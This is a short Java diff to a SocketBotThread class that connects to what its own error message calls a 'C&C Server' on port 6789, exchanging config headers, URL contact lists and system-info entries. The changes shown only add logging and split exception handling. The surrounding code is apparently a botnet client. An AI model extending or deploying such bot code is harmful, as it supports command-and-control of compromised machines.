@@ -3,6 +3,7 @@ package control.client;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
+import java.net.ConnectException;
 import java.net.Socket;
 import java.util.ArrayList;
 import application.Main;
@@ -18,11 +19,13 @@ public class SocketBotThread extends Thread{
 	
 	String serverAddress;
 	Socket clientSocket;
+	Log log;
 	ConfigHeader inConfigHeader;
 	ArrayList<URLEntry> inContactList;
 	ArrayList<SystemInfoEntry> outSystemInfo;
 	
 	public SocketBotThread(String serverAddress) {
+		log = new Log();
 		this.serverAddress = serverAddress;
 	}
 	
@@ -38,11 +41,6 @@ public class SocketBotThread extends Thread{
 			
 			try {
 				clientSocket = new Socket(serverAddress, 6789);
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
-			
-			try {
 	
 				ObjectOutputStream outToServer = new ObjectOutputStream(clientSocket.getOutputStream());
 	            ObjectInputStream inFromServer = new ObjectInputStream(clientSocket.getInputStream());
@@ -60,7 +58,13 @@ public class SocketBotThread extends Thread{
 	            
 	            clientSocket.close();
 	            
-			} catch (IOException | ClassNotFoundException e) {
+			} catch (ConnectException e) {
+				String message = "ERROR: Connection with C&C Server refused";
+				System.out.println(message);
+				log.writeMessage(message);
+			} catch (IOException e) {
+				e.printStackTrace();
+			} catch (ClassNotFoundException e) {
 				e.printStackTrace();
 			}
 			notify();	
